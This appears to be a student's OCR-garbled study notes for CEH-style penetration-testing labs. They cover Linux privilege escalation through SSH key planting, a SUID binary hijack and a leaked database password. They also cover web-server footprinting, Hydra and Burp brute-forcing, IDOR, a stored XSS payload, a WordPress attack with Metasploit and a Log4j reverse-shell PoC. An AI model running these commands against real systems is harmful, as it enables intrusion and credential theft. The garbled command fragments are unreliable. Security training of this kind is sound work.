root root root root root root root root user2 root user2 user2 root user2 user2 user2 root 4096 4096 88 3106 4096 161 4096 1309 33 Sep Sep Sep Dec Sep Dec Feb Aug Feb 7 7 7 5 7 5 12 19 12 19:01 18:32 19:04 2019 19:01 2019 2021 2€2€ 2021 . bash history . bashrc . cache . profile . ssh . viminfo flag . txt user2@ng user2@ng -535045 -535045 authorized keys user2@ng-535€45 cat: authorized user2@ng-535€45 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 id rsa id rsa.pub -gettingstartedprivesc-hzq19 krys: Permission denied -@ttingstartedprivesc-hzq19 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 cd .ssh/ -z9vdd:/root/ .ssh$ Is -z9vdd:/root/ .ssh$ cat authorized keys -z9vdd:/root/ . ssh$
+
+ 
+
+Here we can see that using user2 we still cannot access authorized keys. But there are cases where using user permission, we can also manipulate authorized keys. So in that scenerio we can create our own public and private key and login the target system using them. 
+
+ 
+If we find ourselves with write access to a users/ . s sh/ directory, we can place our public key in the user's ssh directory at /home/usep/ . ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh -keygen and the -f flag to specify the output file: ssh-keygen -f Generating public/private rsa key pair Enter passphpase (empty for no passphpase): Enter same passphpase again: Your identification has been saved in key Your public key has been saved in key. pub The key fingerprint is: SHA256•....SNIP... user@parrot The key's randomapt image is: -CRSA 5072] ...SNIP... ..00+. CSHA256] This will give us two files: key (which we will use with ssh -i) and key. pub, which we will copy to the remote machine. Let us copy key . pub, then on the remote machine, we will add it into /root/ .ssh/authorized_keys:
+
+ 
+This will give us two files: key (which we will use with ssh -i) and key. pub, which we will copy to the remote machine. Let us copy key . pub, then on the remote machine, we will add it into / root/ .ssh/authorized_keys: usep@remotehost$ echo "ssh-rsa AAAAB ...SNIP. . user@parrot" / root/ . Now, the remote server should allow us to log in as that user by using our private key: ssh root@remotehost# -i key
+
+ 
+
+ 
+
+PART II : PRIV ESC ADVANCE 
+
+ 
+
+METHOD 1 : USING FILE ACCESS RIGHTS 
+Access Right Flags The Linux and u_njx access rights flags setuid and setgid (short for set user identity and set group identity)L1] allow users to run an executable with the tile system permissions of the executable's owner or group respectively and to change behaviour in directories. The flags setuid and setgid are needed for tasks that require different privileges than what the user is normally granted.
+
+ 
+File Modes The setuid and setgid bits are normally represented as the values: 4 for setuid 0 2 for setgid 0 In the high-order octal digit of the file mode. For example, 6711 has both the setuid and setgid bits (4 + 2 = 6) 6 - Access Right Flags 7 - Owner Permission of [ Read(4) + Write(2) + Execute(l ) ] 1 - Groups Permission of [ Read(0) + Write(O) + Execute(l) ] 1 - Others Permission of [ Read(0) + Write(0) + Execute(l) I
+
+ 
+
+    Checking permissions : 
+
+ 
+Is greetings welcome Is -1 total 24 1 root root 8296 Sep 22 2e18 greetings -rwsr-xr-x 1 root root 8344 Sep 22 2e18 welcome stat -c %A See -r-x------ root root regular file cat greetings cat: greetings: Permission denied stat -c "%a %A %U %G %F" 4755 -rwsr-xr-x root root regular file groups student student student g s welcome greetings welcome
+
+ 
+
+    If word greeting is present inside welcome then we can have the root access: 
+
+ 
+_ITM_deregisterTMCIoneTabIe __gmon_start _ITM_registerTMCIoneTabIe AWAVI AUATL greetings GCC: (Ubuntu 7.3.e-16ubuntu3) crtstuff.c deregister_tm_clones strings welcome /1ib64/1d-1inux-x86-64.so 2 libc.so.6 setuid system c xa finalize libc start main GLIBC 2.2. 5 3.0 7.
+
+  
+
+    Copy or remove greetings and using bash 
+
+ 
+Is greetings welcome cp / bin/ bash greetings c p: cannot create regular file 'greetings' Permission denied rm grertings rm: remove write-protected regular file rm greetings rm: remove write-protected regular file Is welcome 'greetings' > 'greetings Is Y
+
+ 
+
+    Copy bash into greetings and the run welcome using bash 
+
+Is welcome cp / bin/ bash greetings student@attackdefense. greetin g s welcome . /welcome whoami root
+
+ 
+
+WE HAVE ESCALATED PRIVILEGE USING WRONG PERMISSIONS TO FILES AND DIRECTORIES 
+
+ 
+
+ 
+
+ 
+
+METHOD 2 : GIVEN A SHARED SERVER TO HOST ANY FILES AND WE HAVE CREDENTIALS 
+
+ 
+
+    Go to /var/www/html as here all the shared files are stored. 
+
+data about. php action.php admin admin. php category .php comments . php doc cd / var/www/html student@attackdefense•./var/www/html$ Is feed.php feed.php galleries i.php identification.php include index. html index.php install install.php languagel local nbm.php notification. password .php picture.php plugins php popuphelp.php profile. php qsearch.php random.php register. php search.php search rules.php tags.php template-extension themes tools upgrade. upgrade ws.php php
+
+ 
+
+    Open files which might leak some info. Here db_user is taken. 
+
+ 
+student@attackdefense:/var/www/html$ greo -nr ”db_user” local/ confie/ 'db_user'] 'rooť $pwg_db_link pwg_db_connect($conf[ upgrade_feed.php:63: $pwg_db_link pwg_db_connect($conf[ 'db_hosť], i.php:412: admin/inc1ude/functions_upgrade.php:322: $pwg_db_link $conf['db_user'], 'db_hosť], $conf['db_user'], pwg_db_connect($conf[ 'db_hosť], $conf[ 'db u $ conf[ 'db_passworď], ser'], .$dbuser.'\ $pwg_db_link pwg_db_connect($conf[ 'db_hosť], include/ common.inc.php:115: student@attackdefense:/var/www/html$ cat local/ config/database.inc.php <?php $conf[ $ conf[ $ conf[ $ conf[ $ conf[ 'dblayer'] 'db_base'] 'mysqľ 'piwigo'; 'rooť d _ passworď] 'w31cem3teadIabs' 'd b host $ prefixe Table 'localhosť 'piwigo define('PHPWG INS TAL LED' true); define('PWG CHARSET', define('DB CHARSET', define('DB COL LATE' 'ut f-8'); 'ut f 8') ; ? > student@attackdefense:/var/www/html$
+
+ 
+
+    Login using the password 
+
+$ conf [ 'db _ password'] 'w31cem3teadIabs' $ conf ['db _ host'] 'local host' $ prefixeTab1e — 'piwigo define('PHPWG INSTALLED' true); define('PWG CHARSET', define('DB CHARSET', define('DB COLLATE' I); ? > student@attackdefense:/var/www/html$ Password: root@attackdefense:/var/www/html# c la' su
+root@attackdefense:/var/www/html# whoami root root@attackdefense:/var/www/html# cd \ cd root bash: cd: such file or directory root: No cd / root Is flag cat flag 760a582ebd219e2efb6dec173d416723
+
+ 
+
+WE GOT ROOT ACCESS AS SHARED SERVER 
+
+ 
+
+ 
+
+METHOD 3 : USING LINPEAS OR LINENUM 
+
+ 
+
+LinPEAS : https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS 
+
+LinENUM : https://github.com/rebootuser/LinEnum 
+
+ 
+
+Check for CVE, root permissions, username, shared files, kernel version of OS and many critical areas. 
+
+
+
+#Imp Links
+
+Linpeas : PEASS-ng/linPEAS at master · carlospolop/PEASS-ng · GitHub  
+
+ 
+
+LinEnum : GitHub - rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks  
+
+ 
+
+GTFOBins : GTFOBins  
+
+ 
+
+Priv Esc : Linux Privilege Escalation - HackTricks  
+
+ 
+
+Payload All the things : GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF  
+
+ 
+
+Basic Linux Privilege Escalation - g0tmi1k  
+
+ 
+
+GitHub - diego-treitos/linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels  
+
+ 
+
+Privilege Escalation - Linux · Total OSCP Guide  
+
+ 
+
+THM LinPrivArena : https://medium.com/@kerimkerimov213/tryhackme-linux-privesc-arena-linuxprivescarena-68f1aa58303d 
+
+ 
+
+THM windows priv : https://thmflags.gitbook.io/thm-walkthroughs/difficulty-medium/windows-privesc-arena 
+
+ 
+
+ # Hacking Web Server
+
+ #Footprinting
+
+ TASK 1: INFORMATION GATHERING USING GHOST EYE 
+
+ 
+
+    Parrot : navigate to the Ghost Eye directory. Type cd ghost_eye and press Enter.  
+
+    pip3 install -r requirements.txt  
+
+    python3 ghost_eye.py 
+
+    Let us perform a Whois Lookup. Type 3 for the Enter your choice: option and press Enter. Type certifiedhacker.com in the Enter Domain or IP Address: field and press Enter 
+
+    Let us perform a DNS Lookup on certifiedhacker.com. In the Enter your choice field, type 2 and press Enter to perform DNS Lookup. The Enter Domain or IP Address field appears; type certifiedhacker.com, and press Enter. 
+
+    Now, perform the Clickjacking Test. Type 6 in the Enter your choice field and press Enter. In the Enter the Domain to test field, type certifiedhacker.com and press Enter. 
+
+ 
+
+ 
+
+TASK 3: FOOTPRINT A WEB SERVER USING THE HTTPRECON TOOL  
+
+ 
+
+    Windows : Navigate to E:\CEH-Tools\CEHv12 Module 13 Hacking Web Servers\Web Server Footprinting Tools\httprecon, right-click httprecon.exe 
+
+    Main window of httprecon appears, enter the website URL (here, www.certifiedhacker.com) that you want to footprint and select port number (80) in the Target section. 
+
+    Click Analyze 
+
+    Look at the Get existing tab, and observe the server (nginx) used to develop the webpages. 
+
+    Click the GET long request tab, which lists all GET requests. Next, click the Fingerprint Details tab. 
+
+ 
+
+ 
+
+TASK 5: FOOTPRINT A WEB SERVER USING NETCAT AND TELNET 
+
+  
+
+    nc -vv www.moviescope.com 80 
+
+    type GET / HTTP/1.0 and press Enter twice. 
+
+    Now, perform banner grabbing using telnet. In the terminal window, type telnet www.moviescope.com 80 and press Enter. 
+
+    Now, type GET / HTTP/1.0 and press Enter twice. Telnet will perform the banner grabbing and gather information such as content type, last modified date, accept ranges, ETag, and server information. 
+
+ 
+
+ 
+
+TASK 6: ENUMERATE WEB SERVER INFORMATION USING NMAP SCRIPTING ENGINE (NSE) 
+
+ 
+
+    nmap -sV --script=http-enum [target website] 
+
+    nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap-www.goodshopping.com 
+
+    nmap --script http-trace -d www.goodshopping.com and press Enter. 
+
+
+
+ #Web Server attacks
+
+ TASK 1: CRACK FTP CREDENTIALS USING A DICTIONARY ATTACK 
+
+ 
+
+    nmap -p 21 <targ> 
+
+    ftp <targ> 
+
+    Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file. 
+
+Now in terminal type-  
+
+hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://<targ_ip> 
+
+    hydra -l user -P passlist.txt ftp://<targ> 
+
+    Type mkdir Hacked and press Enter to remotely create a directory named Hacked on the Windows 11 machine through the ftp terminal. 
+
+
+# Hacking Web application
+
+#Footprinting web infra
+
+TASK 1: PERFORM WEB APPLICATION RECONNAISSANCE USING NMAP AND TELNET 
+
+ 
+
+    Whois lookup 
+
+    nmap -T4 -A -v [Target Web Application] 
+
+    type telnet www.moviescope.com 80 
+
+    type GET / HTTP/1.0 
+
+ 
+
+ 
+
+TASK 3: PERFORM WEB SPIDERING USING OWASP ZAP 
+
+ 
+
+    Parrot : cd 
+
+    Terminal : zaproxy 
+
+    The OWASP ZAP initializing window appears; wait for it to complete. 
+
+    select the No, I do not want to persist this session at this moment in time radio button and click Start. If a Manage Add-ons window appears, click the Close button. 
+
+    Under the Quick Start tab, click the Automated Scan option under Welcome to OWASP ZAP. 
+
+    The Automated Scan wizard appears; enter the target website under the URL to attack field (here, www.moviescope.com). Leave the other settings to default and click the Attack button.  
+
+    After performing web spidering, OWASP ZAP performs active scanning. Navigate to the Active Scan tab to observe the various scanned links. 
+
+    After completing the active scan, the results appear under the Alerts tab, displaying the various vulnerabilities and issues associated with the target website, as shown in the screenshot.Note: In this task, the objective being web spidering, we will focus on the information obtained while performing web spidering. 
+
+    Now, click on the Spider tab from the lower section of the window to view the web spidering information. By default, the URLs tab appears under the Spider tab. 
+
+    The URLs tab contains various links for hidden content and functionality associated with the target website 
+
+    Messages tab under the Spider tab to view more detailed information regarding the URLs 
+
+ 
+
+ 
+
+TASK 4: DETECT LOAD BALANCERS USING VARIOUS TOOLS  
+
+ 
+
+    Parrot : go to root directory (cd) 
+
+    dig <url> 
+
+    lbd <url> 
+
+ 
+
+ 
+
+TASK 5: IDENTIFY WEB SERVER DIRECTORIES USING VARIOUS TOOLS 
+
+ 
+
+    nmap -sV --script=http-enum [target domain or IP address] 
+
+    gobuster dir -u [Target Website] -w /home/attacker/Desktop/common.txt, and press Enter.  
+
+    Now directory search  
+
+    cd dirsearch/ 
+
+    python3 dirsearch.py -u http://www.moviescope.com 
+
+    Brute force : python3 dirsearch.py -u http://www.moviescope.com -e aspx and press Enter.  
+
+    dirsearch lists all the files containing aspx extension, 
+
+    python3 dirsearch.py -u http://www.moviescope.com -x 403 and press Enter. 
+
+    dirsearch lists the directories from the target website excluding 403 status code. 
+
+
+
+
+#Attack Perform
+
+TASK 1: PERFORM A BRUTE-FORCE ATTACK USING BURP SUITE 
+
+ 
+
+    Ensure wampserver running on attack machine 
+
+    Go to wordpress website : type http://10.10.1.22:8080/CEH/wp-login.php? (or can be anything) 
+
+    Set up burp proxy : Firefox > Preferences 
+
+    Search proxy > network setting > settings 
+
+    Select the Manual proxy configuration radio button 
+
+    Specify the HTTP Proxy as 127.0.0.1 and the Port as 8080. Tick the Also use this proxy for FTP and HTTPS checkbox and click OK. 
+
+    Launch : navigate to Pentesting → Web Application Analysis → Web Application Proxies → burpsuite 
+
+    I accept 
+
+    Proxy tab > Leave intercept as on. 
+
+    Browser : On the login page of the target WordPress website, type random credentials, here admin and password. Click the Log In button.  
+
+    In Burp : Now, right-click anywhere on the HTTP request window, and from the context menu, click Send to Intruder. 
+
+    Note: Observe that Burp Suite intercepted the entered login credentials. 
+
+    Note: If you do not get the request as shown in the screenshot, then press the Forward button. 
+
+    Now, click on the Intruder tab from the toolbar and observe that under the Intruder tab, the Target tab appears by default. 
+
+    Observe the target host and port values in the Host and Port fields. 
+
+    Click on the Positions tab under the Intruder tab and observe that Burp Suite sets the target positions by default, as shown in the HTTP request. Click the Clear § button from the right-pane to clear the default payload values. 
+
+    select Cluster bomb from the Attack type drop-down list. 
+
+    click Add § from the left-pane. 
+
+    Navigate to the Payloads tab under the Intruder tab and ensure that under the Payload Sets section, the Payload set is selected as 1, and the Payload type is selected as Simple list. 
+
+    Under the Payload Options [Simple list] section, click the Load... button. 
+
+    A file selection window appears; navigate to the location /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist, select the username.txt file, and click the Open button. 
+
+    Payload set 2 : A file selection window appears; navigate to the location /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist, select the password.txt file, and click the Open button. 
+
+    Start attack 
+
+    In the Raw tab under the Request tab, the HTTP request with a set of the correct credentials is displayed. 
+
+    Turn off everything including intercept 
+
+    Remove browser proxy setup by vising settings page in firefox (similar to step 5-6) 
+
+    Click no proxy 
+
+    Login to wordpress using found out creds 
+
+ 
+
+ 
+
+TASK 2: PERFORM PARAMETER TAMPERING USING BURP SUITE  
+
+ 
+
+    Set up proxy just like previous 
+
+    In the Proxy settings, by default, the Intercept tab opens-up. Observe that by default, the interception is active as the button says Intercept is on. Leave it running. 
+
+    Switch back to the browser window, and on the login page of the target website (www.moviescope.com), enter the credentials sam and test. Click the Login button. 
+
+    Switch back to the Burp Suite window and observe that the HTTP request was intercepted by the application. 
+
+    Note: You can observe that the entered login credentials were intercepted by the Burp Suite. 
+
+    Now, keep clicking the Forward button until you are logged into the user account. 
+
+    In browser After clicking the View Profile tab, switch back to the Burp Suite window and keep clicking the Forward button until you get the HTTP request, as shown in the screenshot. 
+
+    Now, click Expand icon present in the right-corner of the window in the INSPECTOR section. 
+
+    Inspector wizard appears, click to expand Query Parameters. 
+
+    You can observe NAME and VALUE columns, double click on the value, or click arrow icon (>). 
+
+    In the next wizard, change the VALUE from 1 to 2 and click Apply Changes button.  
+
+    In the Raw tab, click the Intercept is on button to turn off the interception. 
+
+    After switching off the interception, navigate back to the browser window and observe that the user account associated with ID=2 appears with the name John, as shown in the screenshot. 
+
+    Note: Although we logged in using sam as a username with ID=1, using Burp Suite, we successfully tampered with the ID parameter to obtain information about other user accounts. 
+
+    Similarly, you can edit the id parameter in Burp Suite with any random numeric value to view information about other user accounts. 
+
+    Close everything 
+
+ 
+
+ 
+
+TASK 3: IDENTIFYING XSS VULNERABILITIES IN WEB APPLICATIONS USING PWNXSS 
+
+ 
+
+    Parrot : cd PwnXSS 
+
+    Scan perform : python3 pwnxss.py -u http://testphp.vulnweb.com (or any site) 
+
+    Copy any Query (GET) link under Detected XSS section from the terminal window. 
+
+    Copy the query in firefox 
+
+    We will get results 
+
+ 
+
+ 
+
+TASK 4: EXPLOIT PARAMETER TAMPERING AND XSS VULNERABILITIES IN WEB APPLICATIONS 
+
+    In this task, the target website (www.moviescope.com) is hosted by the victim machine Windows Server 2019. Here, the host machine is the Windows 11 machine.  
+
+    Windows 11 : Open the link in firefox 
+
+    Go to profile 
+
+    You will be redirected to the profile page, which displays the personal information of steve (here, you). You will observe that the value of ID in the personal information and address bar is 4. 
+
+    Change ID to 1 or any number. 
+
+    We will se sam's profile 
+
+    Now change to 3 to see katy's profile  
+
+    Now, click the Contacts tab. Here you will be performing an XSS attack. 
+
+    The Contacts page appears; enter your name or any random name (here, steve) in the Name field; enter the cross-site script (<script>alert("You are hacked")</script>) in the Comment field and click the Submit Comment button. 
+
+    Pop up will appear 
+
+    You have successfully added a malicious script to this page. The comment with the malicious link is stored on the server 
+
+    Go to windows server 19: Open the link , login using sam and test 
+
+    As soon as you click the Contacts tab, the cross-site script running on the backend server is executed, and a pop-up appears, stating, You are Hacked. 
+
+ 
+
+ 
+
+TASK 5: ENUMERATE AND HACK A WEB APPLICATION USING WPSCAN AND METASPLOIT 
+
+ 
+
+    Note: Ensure that the Wampserver is running in Windows Server 2022. To launch Wampserver: 
+
+    Switch to the Windows Server 2022 virtual machine. Click Ctrl+Alt+Del to activate the machine, by default, CEH\Administrator account is selected, type Pa$$w0rd in the Password field and press Enter. 
+
+    type wampserver64 and press Enter to select Wampserver64 from the results. 
+
+    Click the Show hidden icons icon, observe that the WampServer icon appears 
+
+    Wait for this icon to turn green, which indicates that the WampServer is successfully running. 
+
+    Parrot : go to root (cd) 
+
+    type wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --enumerate u and press Enter. 
+
+    Getapi token from login wpscan from website (https://wpscan.com/register) 
+
+    WPScan begins to enumerate the usernames stored in the website’s database. The result appears, displaying detailed information from the target website. 
+
+    Scroll down to the User(s) Identified section and observe the information regarding the available user accounts. 
+
+    To obtain the passwords, you will use the auxiliary module called wordpress_login_enum (in msfconsole) to perform a dictionary attack using the password.txt file (in the Wordlist folder) which you copied to the location /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications. 
+
+    To use the wordpress_login_enum auxiliary module, you need to first launch msfconsole. However, before this, you need to start the PostgreSQL service. 
+
+    type service postgresql start 
+
+    msfconsole > type use auxiliary/scanner/http/wordpress_login_enum and press Enter. 
+
+    type show options 
+
+    This provides a list of options that can be set for this module. As we must obtain the password for the target user account, we will set the below options:  
+
+        PASS_FILE: Sets the password.txt file, using which; you will perform the dictionary attack 
+
+        RHOST: Sets the target machine (here, the Windows Server 2022 IP address)  
+
+        RPORT: Sets the target machine port (here, the Windows Server 2022 port)  
+
+        TARGETURI: Sets the base path to the WordPress website (here, http://[IP Address of Windows Server 2022]:8080/CEH] 
+
+        USERNAME: Sets the username that was obtained in Step#9. (here, admin)  
+
+    Now, in the msfconsole, type the below commands:  
+
+        Type set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt and press Enter to set the file containing the passwords. (here, we are using the password.txt password file). 
+
+        Type set RHOSTS [IP Address of Windows Server 2022] (here, 10.10.1.22) and press Enter to set the target IP address. (Here, the IP address of Windows Server 2022 is 10.10.1.22). 
+
+        Type set RPORT 8080 and press Enter to set the target port. 
+
+        Type set TARGETURI http://[IP Address of Windows Server 2022]:8080/CEH and press Enter to set the base path to the WordPress website (Here, the IP address of Windows Server 2022 is 10.10.1.22). 
+
+        Type set USERNAME admin and press Enter to set the username as admin. 
+
+    Type run 
+
+    The auxiliary module tests various passwords against the given username (admin) and the cracked password is displayed, as shown in the screenshot. 
+
+    Note: Here, the cracked password is qwerty@123(or anything), which might differ in your lab environment. 
+
+    In the address field, type http://[IP Address of Windows Server 2022]:8080/CEH/wp-login.php 
+
+    Type found creds. 
+
+ 
+
+ 
+
+TASK 6: CHECK FOR CLICKJACKING ATTACK  
+
+ 
+
+    Parrot : Go to Go to clickjacking poc html in google (https://clickjacker.io/making-clickjacking-poc)  
+
+    Copy the code and open in code editor in parrot.  
+
+    Change iframe attribute to the website link and save as html file.  
+
+    Open the file in firefox if the site opens in image then yes clickjacking attack. 
+
+ 
+
+ 
+
+ 
+
+Task 9: Gain Access by Exploiting Log4j Vulnerability 
+
+ 
+
+    Go to the website page where given in the question 
+
+    As we can observe that the Log4j vulnerable server is successfully running on the Ubuntu machine, leave the Firefox and website open. 
+
+    Type cd log4j-shell-poc  
+
+    Now, we needed to install JDK 8, to do that open a new terminal window and type sudo su and press Enter to run the programs as a root user. 
+
+    We need to extract JDK zip file which is already placed at /home/attacker location.   
+
+    Type tar -xf jdk-8u202-linux-x64.tar.gz and press Enter, to extract the file. Note: -xf: specifies extract all files. 
+
+    Now we will move the jdk1.8.0_202 into /usr/bin/. To do that, type mv jdk1.8.0_202 /usr/bin/ and press Enter. 
+
+    Now, we need to update the installed JDK path in the poc.py file. 
+
+    Navigate to the previous terminal window. In the terminal, type pluma poc.py and press Enter to open poc.py file 
+
+    In the poc.py file scroll down and in line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac. 
+
+    Scroll down to line 87 and replace jdk1.8.0_20/bin/java with  /usr/bin/jdk1.8.0_202/bin/java 
+
+    Scroll down to line 99 and replace jdk1.8.0_20/bin/java with  /usr/bin/jdk1.8.0_202/bin/java. 
+
+    After making all the changes save the changes and close the poc.py editor window. 
+
+    Now, open a new terminal window and type nc -lvp 9001 and press Enter, to initiate a netcat listener as shown in screenshot. 
+
+    Switch to previous terminal window and type python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001 and press Enter, to start the exploitation and create payload. 
+
+    Now, copy the payload generated in the send me: section.  
+
+    Switch to Firefox browser window, in Username field paste the payload that was copied in previous step and in Password field type password and press Login button as shown in the screenshot. 
+
+    In the Password field you can enter any password.  
+
+    Now switch to the netcat listener, you can see that a reverse shell is opened. 
+
+    Now, type whoami and press Enter. : root 
+
+    We can see that we have shell access to the target web application as a root user. 
+
+ 
+
+ 
+
+Task 5: Perform Cross-site Request Forgery (CSRF) Attack 
+
+    Link : https://bookshelf.vitalsource.com/reader/books/9798885931144/pageid/5406 
+
+   
+
+#Detect Web Vuln
+
+    Task 1: Detect Web Application Vulnerabilities using N-Stalker Web Application Security Scanner 
+
+ 
+
+    Link : https://bookshelf.vitalsource.com/reader/books/9798885931144/pageid/5489 
